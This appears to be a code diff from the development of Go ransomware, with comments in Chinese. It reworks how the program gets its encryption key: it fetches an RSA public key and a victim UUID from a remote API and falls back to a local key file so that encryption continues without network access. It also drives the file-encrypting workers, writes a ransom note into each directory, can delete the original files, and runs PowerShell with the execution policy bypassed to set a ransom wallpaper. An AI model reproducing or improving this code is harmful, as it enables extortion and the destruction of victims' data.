+		strings.ReplaceAll(uuid, "'", "''"),
+		strings.TrimPrefix(version, "v"),
+		removeOriginal)
 
 	if out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script).CombinedOutput(); err != nil {
 		fmt.Printf("[!] 生成壁纸失败: %v (%s)\n", err, strings.TrimSpace(string(out)))
@@ -1157,56 +1506,57 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 	return filesToProcess
 }
 
-func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
+// acquireKeys 统一获取密钥：API 优先；API 不可用（断网/超时/异常响应）时
+// 直接回退到本地公钥，不再因网络问题中止。
+// 返回 (uuid, 公钥PEM, 来源说明, error)
+func acquireKeys() (string, string, string, error) {
+	fmt.Print("[*] 尝试从API获取密钥... ")
+	resp, apiErr := fetchKeysFromAPI()
+	if apiErr == nil {
+		if perr := validatePublicKey(resp.PublicKeyPEM); perr != nil {
+			fmt.Printf("失败: %v\n", perr)
+			apiErr = fmt.Errorf("API 返回的公钥无效: %w", perr)
+		} else {
+			fmt.Printf("成功，UUID: %s\n", resp.UUID)
+			cachePublicKeyCopy(resp.UUID, resp.PublicKeyPEM)
+			return resp.UUID, resp.PublicKeyPEM, "远程API", nil
+		}
+	} else {
+		fmt.Printf("失败: %v\n", apiErr)
+	}
+
+	// 网络不可用（DNS/连接/超时）或 API 异常：直接使用本地密钥
+	fmt.Println("[*] 联网获取密钥失败（网络不可用或 API 异常），回退到本地密钥...")
+	uuid, pemText, filePath, localErr := loadLocalKey()
+	if localErr != nil {
+		return "", "", "", fmt.Errorf("联网获取密钥失败（可能无网络）: %v；本地回退失败: %v", apiErr, localErr)
+	}
+	fmt.Printf("[+] 已加载本地公钥: %s\n", filePath)
+	return uuid, pemText, "本地公钥文件", nil
+}
+
+// validatePublicKey 校验公钥可被解析（静默，调用方负责输出）。
+func validatePublicKey(pemText string) error {
+	if _, err := getPublicKey(pemText); err != nil {
+		return fmt.Errorf("公钥格式错误: %w", err)
+	}
+	return nil
+}
+
+func runEncryptionWorkers(files []string, numWorkers int, stats *counters, uuid, publicKeyValue string, removeOriginal bool) {
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
 
-	// 优先尝试从API获取密钥
-	var uuid string
-	fmt.Print("[*] 尝试从API获取密钥... ")
-	resp, err := fetchKeysFromAPI()
-	if err != nil {
-		fmt.Printf("失败: %v\n", err)
-		fmt.Println("[*] API获取失败，回退到本地密钥...")
-
-		// 回退：尝试从公钥文件名中提取UUID
-		uuid, err2 := extractUUIDFromFilename()
-		if err2 != nil {
-			fmt.Printf("失败: %v\n", err2)
-			fmt.Println("[!] 无法获取密钥，程序终止")
-			os.Exit(1)
-		}
-		fmt.Printf("成功: %s\n", uuid)
-
-		// 从本地文件读取公钥
-		fmt.Print("[*] 从本地文件读取公钥... ")
-		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
-		if err2 != nil {
-			fmt.Printf("失败: %v\n", err2)
-			fmt.Println("[!] 无法读取公钥文件，程序终止")
-			os.Exit(1)
-		}
-		fmt.Println("成功")
-	} else {
-		uuid = resp.UUID
-		publicKeyPEM = resp.PublicKeyPEM
-		fmt.Printf("成功，UUID: %s\n", uuid)
-	}
-
-	// 预解析公钥，确保格式正确
-	fmt.Print("[*] 预解析公钥... ")
-	pubKey, parseErr := getPublicKey(publicKeyPEM)
+	// 公钥预解析（密钥已在 main 中统一获取，避免重复申请 UUID）
+	pubKey, parseErr := getPublicKey(publicKeyValue)
 	if parseErr != nil {
-		fmt.Printf("失败: %v\n", parseErr)
-		fmt.Println("[!] 公钥格式错误，程序终止")
+		fmt.Printf("[!] 公钥格式错误: %v\n", parseErr)
 		os.Exit(1)
 	}
-	fmt.Println("成功")
-	// 存储解析后的公钥到缓存
 	publicKeyCache = pubKey
-	publicKeyCacheStr = publicKeyPEM
+	publicKeyCacheStr = publicKeyValue
 
-	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid)
+	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, ransomNoteNotice(removeOriginal))
 	var visitedDirs sync.Map
 
 	log, err3 := newFileLog("ransom_log.txt")
@@ -1227,7 +1577,7 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 					notePath := filepath.Join(dirPath, ransomNoteFileName)
 					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
 				}
-				if err := processFile(file, publicKeyPEM, removeOriginal); err != nil {
+				if err := processFile(file, publicKeyValue, removeOriginal); err != nil {
 					stats.failed.Add(1)
 
 					// 记录失败日志
@@ -1273,8 +1623,6 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	wg.Wait()
 	close(done)
 	fmt.Println()
-
-	*outUUID = uuid
 
 	if logEnabled {
 		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
